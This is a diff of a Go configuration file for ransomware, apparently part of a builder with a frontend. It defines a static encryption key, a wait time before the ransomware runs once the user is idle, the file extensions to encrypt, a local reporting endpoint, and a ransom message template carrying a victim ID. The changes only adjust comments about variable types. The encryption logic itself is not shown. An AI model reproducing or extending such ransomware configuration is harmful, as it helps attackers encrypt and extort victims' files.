@@ -28,6 +28,7 @@ var StaticKey = "12345678901234567890123456789012" ///insecure af
 
 // WaitAfk uint Time to wait until the user is considered afk and the ransomware is ran, in nanoseconds (divide by 1000000000)
 var WaitAfk = 1000000000 ///for debugging purposes
+///maybe make this text instead of uint
 
 // extensionsSlice stringSlice Files which have any of these extensions will get encrypted by the ransomware
 var extensionsSlice = []string{
@@ -49,12 +50,13 @@ var endpoint = "127.0.0.1:6031/ransomware"
 var charset = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ0123456789!@#$%^&*()_-+={}[]:\";'\\<>,.?/`~"
 
 ///TODO: make this work somehow
-// Key any If you want to use a satic key, put it here
+// Key text any If you want to use a satic key, put it here
 var Key = GenerateKey()
 
 /// TODO: code a custom uuid thingy or use a package
 var UUID = ""
 
-/// TODO: check if go has string interpolation
-/// Change this message based on what you want the user to see
+///Text as the data type means the user types exactly what the variable will have (in this case
+///the input from the frontend will have exactly this -> "Your unique id is " + UUID + " other text you might want here"
+// Message text Change this message based on what you want the user to see
 var Message = "Your unique id is " + UUID + " other text you might want here"
